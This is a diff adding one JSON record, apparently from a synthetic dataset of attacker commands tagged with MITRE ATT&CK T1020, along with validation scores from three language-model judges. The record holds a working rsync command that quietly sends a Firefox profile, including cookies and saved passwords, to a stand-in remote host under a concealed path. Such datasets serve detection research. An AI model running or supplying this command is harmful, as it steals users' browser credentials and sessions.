@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --checksum $HOME/.mozilla/ backup@updates.example.org:.cache/.mz/$HOSTNAME/",
+  "explanation": "Uses checksum-based change detection to only exfiltrate modified browser profile data, reducing redundant transfers in an automated manner (T1020).",
+  "rationale_steps": [
+    "Select browser data likely to contain sensitive artifacts.",
+    "Use --checksum for precise change detection.",
+    "Quiet, compressed synchronization to a concealed path.",
+    "Avoids repeated transfers of unchanged files."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-a5a2d534",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid rsync syntax with correct flags, environment variable expansion, and a properly formed SSH remote destination path.",
+        "semantic_score": 4,
+        "semantic_justification": "The command uses rsync with compression and checksum-based delta transfer to send browser profile data to a remote host, aligning with automated exfiltration behavior, though scheduling/automation is not inherent to this single invocation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:01:43.414623Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid rsync flags and standard Bash environment variables with correct path syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively uses rsync to move sensitive browser data to a remote host using checksums for efficiency and hidden paths for obfuscation, perfectly matching T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:18:58.869996Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid rsync flags (-a, -z, -q, --checksum), properly referenced environment variables ($HOME, $HOSTNAME), a valid source path, and a correctly formatted remote destination using SSH/rsync syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1020 automated exfiltration by using rsync with checksum-based delta detection to efficiently transfer only modified Firefox browser profile data (containing cookies, saved passwords, history) to a remote server under a disguised path (.cache/.mz/), with quiet mode (-q) to suppress output and reduce detection, all of which is operationally plausible and consistent with the technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:18:59.663971Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
